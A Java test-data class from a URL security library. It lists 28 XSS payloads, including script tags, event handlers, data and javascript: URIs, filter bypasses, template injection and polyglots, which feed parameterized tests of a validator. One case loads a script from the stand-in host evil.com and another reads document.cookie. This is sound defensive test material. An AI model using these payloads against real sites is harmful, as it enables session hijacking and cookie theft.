/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.database;

import de.cuioss.tools.security.http.core.UrlSecurityFailureType;

import java.util.List;

/**
 * Database of XSS (Cross-Site Scripting) injection attack patterns with comprehensive vulnerability coverage.
 * 
 * <p><strong>CRITICAL XSS SECURITY DATABASE:</strong> This database contains comprehensive XSS
 * attack vectors designed to test security validation against cross-site scripting attacks.
 * XSS attacks involve injecting malicious scripts into web applications that are then
 * executed in users' browsers, potentially leading to session hijacking, credential
 * theft, and other security vulnerabilities.</p>
 * 
 * <p>These attacks cover the full spectrum of XSS vulnerability types including reflected,
 * stored, and DOM-based XSS, with various encoding techniques, filter bypass methods,
 * and context-specific injection approaches to test comprehensive XSS protection mechanisms.</p>
 * 
 * <h3>XSS Attack Categories</h3>
 * <ul>
 *   <li><strong>Reflected XSS</strong> - Script tags and HTML injection in URL parameters</li>
 *   <li><strong>Stored XSS</strong> - Persistent script injection patterns in user content</li>
 *   <li><strong>DOM-based XSS</strong> - Client-side script manipulation through DOM sinks</li>
 *   <li><strong>Event Handler Injection</strong> - onload, onclick, onerror event exploitation</li>
 *   <li><strong>JavaScript Protocol</strong> - javascript: URL scheme exploitation</li>
 *   <li><strong>Data URI XSS</strong> - Base64 and direct data URI script injection</li>
 *   <li><strong>SVG-based XSS</strong> - Vector graphics script injection techniques</li>
 *   <li><strong>Filter Bypass</strong> - Encoding and obfuscation techniques</li>
 *   <li><strong>Template Injection</strong> - Server-side template attack patterns</li>
 *   <li><strong>Polyglot Payloads</strong> - Multi-context attack vectors</li>
 * </ul>
 * 
 * <h3>Security Standards</h3>
 * <ul>
 *   <li><strong>OWASP Top 10</strong> - A03:2021 Injection</li>
 *   <li><strong>CWE-79</strong> - Improper Neutralization of Input During Web Page Generation</li>
 *   <li><strong>CWE-83</strong> - Improper Neutralization of Script in Attributes</li>
 *   <li><strong>CWE-87</strong> - Improper Neutralization of Alternate XSS Syntax</li>
 *   <li><strong>CWE-116</strong> - Improper Encoding or Escaping of Output</li>
 *   <li><strong>CWE-692</strong> - Incomplete Blacklist to Cross-Site Scripting</li>
 * </ul>
 * 
 * @since 2.5
 */
public class XssInjectionAttackDatabase implements AttackDatabase {

    // Basic Script Tag Injection Attacks
    public static final AttackTestCase BASIC_SCRIPT_TAG_ALERT = new AttackTestCase(
            "/admin?q=<script>alert('XSS')</script>",
            UrlSecurityFailureType.XSS_DETECTED,
            "Basic XSS attack using standard HTML script tags with alert() function. This fundamental XSS payload tests the most common form of cross-site scripting where malicious JavaScript is injected directly into HTML content through user input fields or URL parameters.",
            "XSS_DETECTED is expected because the payload contains HTML script tags with JavaScript code (alert function) designed to execute arbitrary scripts in the victim's browser context."
    );

    public static final AttackTestCase SCRIPT_TAG_COOKIE_THEFT = new AttackTestCase(
            "/user?q=<script>alert(document.cookie)</script>",
            UrlSecurityFailureType.XSS_DETECTED,
            "XSS attack targeting cookie theft through document.cookie access. This attack demonstrates how XSS can be used to steal session cookies and authentication tokens, representing a critical security vulnerability that can lead to account takeover.",
            "XSS_DETECTED is expected because the script contains JavaScript code designed to access and display sensitive browser cookies, representing a classic cross-site scripting attack vector."
    );

    public static final AttackTestCase EXTERNAL_SCRIPT_INCLUSION = new AttackTestCase(
            "/api?q=<script src=//evil.com/xss.js></script>",
            UrlSecurityFailureType.XSS_DETECTED,
            "External script inclusion XSS attack loading malicious JavaScript from attacker-controlled domains. This technique allows attackers to execute complex payloads hosted externally, bypassing content length restrictions and enabling sophisticated multi-stage attacks.",
            "XSS_DETECTED is expected because the script tag references external malicious JavaScript resources (//evil.com/xss.js) designed to execute attacker-controlled code in the victim's browser."
    );

    public static final AttackTestCase BASE64_ENCODED_XSS = new AttackTestCase(
            "/config?q=<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
            UrlSecurityFailureType.XSS_DETECTED,
            "Base64-encoded XSS attack using eval() and atob() to execute obfuscated JavaScript. The base64 string 'YWxlcnQoJ1hTUycpOw==' decodes to 'alert('XSS');', demonstrating how encoding can be used to bypass simple string-based XSS filters.",
            "XSS_DETECTED is expected because despite base64 obfuscation, the script contains eval() function calls designed to execute dynamically decoded malicious JavaScript code."
    );

    // Event Handler Injection Attacks
    public static final AttackTestCase IMAGE_ONERROR_HANDLER = new AttackTestCase(
            "/user?data=<img src=x onerror=alert('XSS')>",
            UrlSecurityFailureType.XSS_DETECTED,
            "Event handler XSS attack using image onerror event to execute JavaScript. This technique exploits HTML event handlers to execute scripts when specific events occur, such as image loading failures, providing an alternative to direct script tag injection.",
            "XSS_DETECTED is expected because the HTML image tag contains an onerror event handler with JavaScript code (alert function) designed to execute when the image fails to load."
    );

    public static final AttackTestCase BODY_ONLOAD_HANDLER = new AttackTestCase(
            "/admin?data=<body onload=alert('XSS')>",
            UrlSecurityFailureType.XSS_DETECTED,
            "Body onload event handler XSS attack executing JavaScript when the page loads. This attack exploits the body element's onload event to execute malicious scripts automatically when the page is rendered, requiring no user interaction.",
            "XSS_DETECTED is expected because the HTML body tag contains an onload event handler designed to execute JavaScript code automatically when the page loads in the browser."
    );

    public static final AttackTestCase INPUT_AUTOFOCUS_ATTACK = new AttackTestCase(
            "/search?data=<input onfocus=alert('XSS') autofocus>",
            UrlSecurityFailureType.XSS_DETECTED,
            "Input field XSS attack using autofocus and onfocus event handlers. The autofocus attribute automatically focuses the input element when the page loads, immediately triggering the onfocus event handler to execute malicious JavaScript without user interaction.",
            "XSS_DETECTED is expected because the input element combines autofocus with onfocus event handler containing JavaScript code, creating an automatic script execution vulnerability."
    );

    // JavaScript Protocol Injection
    public static final AttackTestCase JAVASCRIPT_PROTOCOL_BASIC = new AttackTestCase(
            "/redirect?redirect=javascript:alert('XSS')",
            UrlSecurityFailureType.XSS_DETECTED,
            "JavaScript protocol injection using javascript: URL scheme to execute scripts. This attack exploits URL handling that processes javascript: protocols, allowing direct script execution through URL manipulation in redirects, links, or form actions.",
            "XSS_DETECTED is expected because the javascript: URL scheme contains executable JavaScript code (alert function) designed to execute scripts through protocol handler exploitation."
    );

    public static final AttackTestCase JAVASCRIPT_PROTOCOL_OBFUSCATED = new AttackTestCase(
            "/proxy?redirect=javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
            UrlSecurityFailureType.XSS_DETECTED,
            "Obfuscated JavaScript protocol attack using String.fromCharCode() to encode the payload. The character codes (97,108,101,114,116,40,49,41) decode to 'alert(1)', demonstrating how character encoding can bypass javascript: protocol filters.",
            "XSS_DETECTED is expected because despite character code obfuscation, the javascript: protocol contains eval() and String.fromCharCode() designed to execute dynamically constructed malicious scripts."
    );

    public static final AttackTestCase JAVASCRIPT_PROTOCOL_CASE_VARIATION = new AttackTestCase(
            "/forward?redirect=JaVaScRiPt:alert('XSS')",
            UrlSecurityFailureType.XSS_DETECTED,
            "JavaScript protocol case variation attack using mixed case to bypass simple string matching filters. This demonstrates how case-insensitive protocol handling can be exploited when security filters only check for lowercase 'javascript:' strings.",
            "XSS_DETECTED is expected because despite case variation, the protocol (JaVaScRiPt:) contains executable JavaScript code designed to bypass case-sensitive XSS filters through protocol exploitation."
    );

    // Data URI XSS Attacks
    public static final AttackTestCase DATA_URI_HTML_SCRIPT = new AttackTestCase(
            "/proxy?url=data:text/html,<script>alert('XSS')</script>",
            UrlSecurityFailureType.XSS_DETECTED,
            "Data URI XSS attack embedding HTML with JavaScript directly in the data: scheme. This technique allows injection of complete HTML documents containing scripts through data URIs, bypassing traditional content filtering that doesn't examine URI contents.",
            "XSS_DETECTED is expected because the data: URI contains embedded HTML with script tags designed to execute cross-site scripting when the URI is processed as HTML content."
    );

    public static final AttackTestCase DATA_URI_BASE64_ENCODED = new AttackTestCase(
            "/content?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            UrlSecurityFailureType.XSS_DETECTED,
            "Base64-encoded data URI XSS attack where the base64 string decodes to '<script>alert('XSS')</script>'. This double-encoding technique (base64 within data URI) can bypass content inspection that doesn't properly decode nested encoding layers.",
            "XSS_DETECTED is expected because the base64-encoded data URI contains HTML script content that executes JavaScript when decoded and processed by browsers supporting data URIs."
    );

    public static final AttackTestCase DATA_URI_SVG_SCRIPT = new AttackTestCase(
            "/image?url=data:image/svg+xml,<svg onload=alert('XSS')>",
            UrlSecurityFailureType.XSS_DETECTED,
            "SVG data URI XSS attack embedding JavaScript within SVG image content. This exploits the ability of SVG images to contain executable scripts, using data URIs to inject malicious SVG documents that execute JavaScript when rendered.",
            "XSS_DETECTED is expected because the SVG data URI contains onload event handlers with JavaScript code, enabling cross-site scripting through malicious image content manipulation."
    );

    // HTML Attribute Injection
    public static final AttackTestCase ATTRIBUTE_BREAKING_SINGLE_QUOTE = new AttackTestCase(
            "/search?value=' onload='alert(`XSS`)' '",
            UrlSecurityFailureType.XSS_DETECTED,
            "HTML attribute injection attack breaking out of single-quoted attributes to inject event handlers. This demonstrates how improperly escaped user input in HTML attributes can be exploited to break attribute boundaries and inject malicious JavaScript event handlers.",
            "XSS_DETECTED is expected because the payload breaks out of single-quoted HTML attributes and injects onload event handlers containing JavaScript code designed to execute cross-site scripting attacks."
    );

    public static final AttackTestCase ATTRIBUTE_BREAKING_DOUBLE_QUOTE = new AttackTestCase(
            "/form?value=\\\" onmouseover=\\\"alert('XSS')\\\" \\\"",
            UrlSecurityFailureType.XSS_DETECTED,
            "HTML attribute injection using double quotes to break attribute boundaries and inject mouseover event handlers. This attack exploits contexts where user input is placed within double-quoted HTML attributes without proper escaping.",
            "XSS_DETECTED is expected because the payload breaks out of double-quoted HTML attributes to inject onmouseover event handlers with JavaScript code for cross-site scripting execution."
    );

    public static final AttackTestCase ATTRIBUTE_TAG_BREAKING = new AttackTestCase(
            "/input?value='><script>alert('XSS')</script><'",
            UrlSecurityFailureType.XSS_DETECTED,
            "HTML attribute injection that breaks out of both attribute and tag contexts to inject complete script elements. This demonstrates how insufficient input validation can allow attackers to escape HTML contexts entirely and inject arbitrary content.",
            "XSS_DETECTED is expected because the payload breaks out of HTML attribute and tag contexts ('><) to inject complete script elements containing JavaScript code for cross-site scripting attacks."
    );

    // SVG-based XSS Attacks
    public static final AttackTestCase SVG_ONLOAD_BASIC = new AttackTestCase(
            "/content?content=<svg onload=alert('XSS')>",
            UrlSecurityFailureType.XSS_DETECTED,
            "SVG onload event XSS attack using Scalable Vector Graphics elements to execute JavaScript. SVG elements support event handlers like onload, providing an alternative vector for XSS attacks that may bypass filters focused on traditional HTML elements.",
            "XSS_DETECTED is expected because the SVG element contains onload event handlers with JavaScript code (alert function) designed to execute cross-site scripting when the SVG is processed."
    );

    public static final AttackTestCase SVG_SCRIPT_ELEMENT = new AttackTestCase(
            "/image?content=<svg><script>alert('XSS')</script></svg>",
            UrlSecurityFailureType.XSS_DETECTED,
            "SVG with embedded script element demonstrating how SVG documents can contain executable JavaScript code. This attack exploits the XML-based nature of SVG that allows script elements within the SVG namespace to execute JavaScript.",
            "XSS_DETECTED is expected because the SVG contains embedded script elements with JavaScript code, enabling cross-site scripting through malicious vector graphics content."
    );

    public static final AttackTestCase SVG_FOREIGN_OBJECT = new AttackTestCase(
            "/graphics?content=<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>",
            UrlSecurityFailureType.XSS_DETECTED,
            "SVG foreignObject XSS attack using the foreignObject element to embed HTML content including scripts within SVG. This technique exploits SVG's ability to include foreign content namespaces, allowing HTML script injection within SVG contexts.",
            "XSS_DETECTED is expected because the SVG foreignObject element contains embedded HTML script elements designed to execute JavaScript code through cross-namespace content injection."
    );

    // Filter Bypass Techniques
    public static final AttackTestCase HTML_ENTITY_ENCODING = new AttackTestCase(
            "/search?input=&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;",
            UrlSecurityFailureType.XSS_DETECTED,
            "HTML entity encoding XSS bypass using decimal character references to obfuscate script tags. The entities &#60; (< ), &#62; (>), and &#39; (') encode the script tag characters, potentially bypassing filters that only check for literal HTML syntax.",
            "XSS_DETECTED is expected because despite HTML entity encoding, the content decodes to script tags with JavaScript code designed to execute cross-site scripting attacks."
    );

    public static final AttackTestCase MIXED_CASE_BYPASS = new AttackTestCase(
            "/form?input=<ScRiPt>alert('XSS')</ScRiPt>",
            UrlSecurityFailureType.XSS_DETECTED,
            "Mixed case XSS bypass using irregular capitalization to evade simple string matching filters. This demonstrates how case-insensitive HTML parsing can be exploited when security filters only check for specific case patterns.",
            "XSS_DETECTED is expected because despite mixed case obfuscation, the content contains script tags with JavaScript code that will be processed by case-insensitive HTML parsers."
    );

    public static final AttackTestCase NULL_BYTE_INJECTION = new AttackTestCase(
            "/data?input=<script\\u0000>alert('XSS')</script>",
            UrlSecurityFailureType.XSS_DETECTED,
            "Null byte injection XSS attack using Unicode null characters to bypass string-based filters. The null byte (\\u0000) can terminate string processing in vulnerable parsers while being ignored by HTML processors, allowing filter bypass.",
            "XSS_DETECTED is expected because despite null byte injection, the HTML contains script tags with JavaScript code that may execute after null byte processing by vulnerable parsers."
    );

    // Template Injection Attacks
    public static final AttackTestCase ANGULAR_TEMPLATE_INJECTION = new AttackTestCase(
            "/app?template={{constructor.constructor('alert(\\\"XSS\\\")')()}}",
            UrlSecurityFailureType.XSS_DETECTED,
            "AngularJS template injection XSS attack using constructor chaining to execute arbitrary JavaScript. This exploits AngularJS expression parsing to access the Function constructor and execute malicious code within template contexts.",
            "XSS_DETECTED is expected because the AngularJS template expression uses constructor chaining to execute JavaScript code (alert function) through template injection vulnerabilities."
    );

    public static final AttackTestCase HANDLEBARS_TEMPLATE_INJECTION = new AttackTestCase(
            "/render?template={{#with \\\"constructor\\\"}}{{#with ../constructor}}{{../constructor.constructor(\\\"alert('XSS')\\\"())}}{{/with}}{{/with}}",
            UrlSecurityFailureType.XSS_DETECTED,
            "Handlebars template injection attack using context manipulation to access constructor functions. This complex payload exploits Handlebars helper chaining to escape template sandboxing and execute arbitrary JavaScript code.",
            "XSS_DETECTED is expected because the Handlebars template uses context manipulation and constructor access to execute JavaScript code through server-side template injection vulnerabilities."
    );

    // DOM-based XSS
    public static final AttackTestCase DOM_FRAGMENT_INJECTION = new AttackTestCase(
            "/page#<script>alert('XSS')</script>",
            UrlSecurityFailureType.XSS_DETECTED,
            "DOM-based XSS attack using URL fragment (hash) to inject scripts processed by client-side JavaScript. This exploits client-side code that processes location.hash or similar DOM properties without proper sanitization.",
            "XSS_DETECTED is expected because the URL fragment contains script tags with JavaScript code that may be processed by vulnerable client-side DOM manipulation code."
    );

    public static final AttackTestCase DOM_LOCALSTORAGE_XSS = new AttackTestCase(
            "/app?data=<script>localStorage.setItem('xss','<script>alert(1)</script>');alert('XSS')</script>",
            UrlSecurityFailureType.XSS_DETECTED,
            "DOM-based XSS attack targeting localStorage manipulation to persist malicious scripts. This demonstrates how client-side storage can be poisoned with XSS payloads that execute when the stored data is later processed by the application.",
            "XSS_DETECTED is expected because the script manipulates localStorage with malicious content and contains immediate JavaScript execution designed for DOM-based cross-site scripting attacks."
    );

    // Polyglot Payloads
    public static final AttackTestCase POLYGLOT_MULTI_CONTEXT = new AttackTestCase(
            "/search?payload='\\\"--></script></title></textarea></style></template></noembed></noscript></iframe></noframes></plaintext></xmp><svg onload=alert()>",
            UrlSecurityFailureType.XSS_DETECTED,
            "Polyglot XSS payload designed to work across multiple HTML contexts by closing various HTML elements and injecting SVG with script execution. This comprehensive payload attempts to break out of numerous possible HTML contexts where user input might be placed.",
            "XSS_DETECTED is expected because the polyglot payload contains multiple context-breaking sequences and concludes with SVG onload handlers designed to execute JavaScript across various HTML injection contexts."
    );

    public static final AttackTestCase POLYGLOT_JAVASCRIPT_CONTEXT = new AttackTestCase(
            "/api?payload=';alert('XSS');var a='",
            UrlSecurityFailureType.XSS_DETECTED,
            "JavaScript context polyglot payload designed to break out of JavaScript string contexts and execute malicious code. This payload works when user input is placed within JavaScript strings by properly terminating the string and injecting executable code.",
            "XSS_DETECTED is expected because the payload breaks out of JavaScript string contexts (using quotes and semicolons) and contains alert function calls designed to execute cross-site scripting within JavaScript code."
    );

    private static final List<AttackTestCase> ALL_ATTACK_TEST_CASES = List.of(
            BASIC_SCRIPT_TAG_ALERT,
            SCRIPT_TAG_COOKIE_THEFT,
            EXTERNAL_SCRIPT_INCLUSION,
            BASE64_ENCODED_XSS,
            IMAGE_ONERROR_HANDLER,
            BODY_ONLOAD_HANDLER,
            INPUT_AUTOFOCUS_ATTACK,
            JAVASCRIPT_PROTOCOL_BASIC,
            JAVASCRIPT_PROTOCOL_OBFUSCATED,
            JAVASCRIPT_PROTOCOL_CASE_VARIATION,
            DATA_URI_HTML_SCRIPT,
            DATA_URI_BASE64_ENCODED,
            DATA_URI_SVG_SCRIPT,
            ATTRIBUTE_BREAKING_SINGLE_QUOTE,
            ATTRIBUTE_BREAKING_DOUBLE_QUOTE,
            ATTRIBUTE_TAG_BREAKING,
            SVG_ONLOAD_BASIC,
            SVG_SCRIPT_ELEMENT,
            SVG_FOREIGN_OBJECT,
            HTML_ENTITY_ENCODING,
            MIXED_CASE_BYPASS,
            NULL_BYTE_INJECTION,
            ANGULAR_TEMPLATE_INJECTION,
            HANDLEBARS_TEMPLATE_INJECTION,
            DOM_FRAGMENT_INJECTION,
            DOM_LOCALSTORAGE_XSS,
            POLYGLOT_MULTI_CONTEXT,
            POLYGLOT_JAVASCRIPT_CONTEXT
    );

    @Override
    public Iterable<AttackTestCase> getAttackTestCases() {
        return ALL_ATTACK_TEST_CASES;
    }

    @Override
    public String getDatabaseName() {
        return "XSS Injection Attack Database";
    }

    @Override
    public String getDescription() {
        return "Comprehensive database of XSS (Cross-Site Scripting) attack patterns including script injection, event handlers, protocol exploitation, data URIs, SVG attacks, filter bypasses, template injection, DOM-based XSS, and polyglot payloads";
    }

    /**
     * Modern JUnit 5 ArgumentsProvider for seamless parameterized testing without @MethodSource boilerplate.
     * 
     * <p><strong>Clean Usage Pattern (2024-2025):</strong></p>
     * <pre>
     * &#64;ParameterizedTest
     * &#64;ArgumentsSource(XssInjectionAttackDatabase.ArgumentsProvider.class)
     * void shouldRejectXssInjectionAttacks(AttackTestCase testCase) {
     *     // Test implementation - NO static method or @MethodSource needed!
     * }
     * </pre>
     * 
     * @since 2.5
     */
    public static class ArgumentsProvider extends AttackDatabase.ArgumentsProvider<XssInjectionAttackDatabase> {
        // Implementation inherited - uses reflection to create database instance
    }
}